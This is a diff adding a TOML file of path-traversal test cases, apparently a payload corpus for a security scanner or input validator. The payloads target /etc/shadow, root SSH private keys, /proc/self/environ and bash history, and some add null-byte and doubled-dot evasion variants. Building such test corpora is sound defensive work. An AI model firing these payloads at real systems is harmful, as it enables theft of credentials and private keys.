@@ -1,0 +1,117 @@
+schema = 1
+# Linux/Unix path traversal.
+
+[[case]]
+id = "etc_passwd"
+class = "path"
+payload = "../../../../etc/passwd"
+
+[[case]]
+id = "etc_shadow"
+class = "path"
+payload = "../../../../etc/shadow"
+
+[[case]]
+id = "etc_hosts"
+class = "path"
+payload = "../../../../etc/hosts"
+
+[[case]]
+id = "etc_resolv_conf"
+class = "path"
+payload = "../../../../etc/resolv.conf"
+
+[[case]]
+id = "var_log_auth"
+class = "path"
+payload = "../../../../var/log/auth.log"
+
+[[case]]
+id = "proc_self_environ"
+class = "path"
+payload = "../../../proc/self/environ"
+
+[[case]]
+id = "proc_self_cmdline"
+class = "path"
+payload = "../../../proc/self/cmdline"
+
+[[case]]
+id = "proc_self_status"
+class = "path"
+payload = "../../../proc/self/status"
+
+[[case]]
+id = "proc_self_maps"
+class = "path"
+payload = "../../../proc/self/maps"
+
+[[case]]
+id = "root_ssh_authorized"
+class = "path"
+payload = "../../../root/.ssh/authorized_keys"
+
+[[case]]
+id = "root_ssh_id_rsa"
+class = "path"
+payload = "../../../root/.ssh/id_rsa"
+
+[[case]]
+id = "home_user_bash_history"
+class = "path"
+payload = "../../../home/user/.bash_history"
+
+[[case]]
+id = "varied_depth_2"
+class = "path"
+payload = "../../etc/passwd"
+
+[[case]]
+id = "varied_depth_8"
+class = "path"
+payload = "../../../../../../../../etc/passwd"
+
+[[case]]
+id = "with_leading_slash"
+class = "path"
+payload = "/etc/passwd"
+
+[[case]]
+id = "absolute_with_dotslash"
+class = "path"
+payload = "/./etc/passwd"
+
+[[case]]
+id = "absolute_double_dotslash"
+class = "path"
+payload = "//etc//passwd"
+
+[[case]]
+id = "double_dot_no_slash"
+class = "path"
+payload = "....//....//....//etc/passwd"
+
+[[case]]
+id = "dot_slash_only"
+class = "path"
+payload = "./../etc/passwd"
+
+[[case]]
+id = "trailing_null"
+class = "path"
+payload = "../../etc/passwd%00"
+
+[[case]]
+id = "trailing_null_extension"
+class = "path"
+payload = "../../etc/passwd%00.png"
+
+[[case]]
+id = "trailing_question"
+class = "path"
+payload = "../../etc/passwd?"
+
+[[case]]
+id = "trailing_hash"
+class = "path"
+payload = "../../etc/passwd#"
